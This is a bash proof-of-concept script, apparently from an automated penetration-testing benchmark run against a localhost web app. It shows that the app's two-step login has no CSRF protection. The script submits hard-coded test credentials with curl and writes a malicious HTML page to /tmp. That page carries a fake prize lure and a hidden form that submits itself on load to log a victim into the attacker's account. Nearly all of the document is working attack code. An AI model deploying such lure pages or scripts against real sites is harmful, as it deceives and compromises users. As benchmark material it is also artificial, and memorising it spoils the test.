#!/bin/bash
# POC: Demonstrates CSRF vulnerability in login form by showing successful authentication without CSRF tokens and generating a malicious auto-submit HTML form
# Target: ./repo
# Created: 2025-10-30T20:00:39.144Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

# CSRF on Login Form - Proof of Concept
# This demonstrates that the login form lacks CSRF protection

TARGET="http://localhost:8082"
echo "========================================="
echo "CSRF on Login Form - POC"
echo "========================================="
echo ""
echo "Target: $TARGET"
echo ""

# Step 1: Verify no CSRF token in initial login form
echo "[*] Step 1: Checking for CSRF token in username form..."
RESPONSE=$(curl -s "$TARGET")
CSRF_CHECK=$(echo "$RESPONSE" | grep -i "csrf\|token\|_token")

if [ -z "$CSRF_CHECK" ]; then
    echo "[+] CONFIRMED: No CSRF token found in username form"
else
    echo "[-] CSRF token found: $CSRF_CHECK"
    exit 1
fi
echo ""

# Step 2: Submit username without CSRF token (should succeed)
echo "[*] Step 2: Submitting username 'test' without CSRF token..."
USERNAME_RESPONSE=$(curl -s -L -c cookies.txt -w "\nHTTP_CODE:%{http_code}" \
    -X POST "$TARGET" \
    -d "username=test")

HTTP_CODE=$(echo "$USERNAME_RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
echo "[+] Response HTTP Code: $HTTP_CODE"

if echo "$USERNAME_RESPONSE" | grep -q "Welcome"; then
    echo "[+] CONFIRMED: Username submission succeeded without CSRF token"
else
    echo "[-] Username submission failed"
    echo "$USERNAME_RESPONSE"
fi
echo ""

# Step 3: Check password form for CSRF token
echo "[*] Step 3: Checking password form for CSRF token..."
PASSWORD_FORM=$(curl -s -b cookies.txt "$TARGET/password/test")
CSRF_CHECK_PASS=$(echo "$PASSWORD_FORM" | grep -i "csrf\|token" | grep -v "user_id" | grep -v "username")

if [ -z "$CSRF_CHECK_PASS" ]; then
    echo "[+] CONFIRMED: No CSRF token found in password form"
else
    echo "[-] CSRF token found in password form"
    exit 1
fi
echo ""

# Step 4: Submit password without CSRF token (should succeed)
echo "[*] Step 4: Submitting password without CSRF token..."
PASSWORD_RESPONSE=$(curl -s -L -b cookies.txt -c cookies_final.txt -w "\nHTTP_CODE:%{http_code}" \
    -X POST "$TARGET/password/test" \
    -d "username=test&user_id=10032&password=test")

HTTP_CODE_PASS=$(echo "$PASSWORD_RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
echo "[+] Response HTTP Code: $HTTP_CODE_PASS"

if echo "$PASSWORD_RESPONSE" | grep -q "Dashboard\|Welcome"; then
    echo "[+] CONFIRMED: Login completed successfully without CSRF token"
else
    echo "[-] Login failed"
fi
echo ""

# Step 5: Create malicious HTML POC
echo "[*] Step 5: Generating malicious CSRF HTML POC..."
cat > /tmp/csrf_login_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>You've won a prize! Loading...</h1>
    
    <!-- Hidden form that auto-submits to log victim into attacker's account -->
    <form id="csrf-form" action="http://localhost:8082" method="POST" style="display:none;">
        <input type="text" name="username" value="test">
    </form>
    
    <script>
        // Auto-submit the form when page loads
        document.getElementById('csrf-form').submit();
    </script>
    
    <p>If the victim visits this page, they will be logged into the attacker's account without their knowledge.</p>
</body>
</html>
EOF

echo "[+] Malicious HTML file created at: /tmp/csrf_login_attack.html"
echo ""

# Cleanup
rm -f cookies.txt cookies_final.txt

echo "========================================="
echo "VULNERABILITY CONFIRMED"
echo "========================================="
echo ""
echo "Summary:"
echo "- No CSRF token in username submission form"
echo "- No CSRF token in password submission form"
echo "- Both steps of authentication process are vulnerable to CSRF"
echo "- An attacker can create a malicious webpage that logs victims into attacker-controlled accounts"
echo ""
echo "Attack Scenario:"
echo "1. Attacker creates malicious webpage (generated at /tmp/csrf_login_attack.html)"
echo "2. Victim visits attacker's webpage"
echo "3. Hidden form auto-submits to login endpoint"
echo "4. Victim is logged into attacker's account without knowledge"
echo "5. Victim's actions/data are captured under attacker's account (Login CSRF)"
echo ""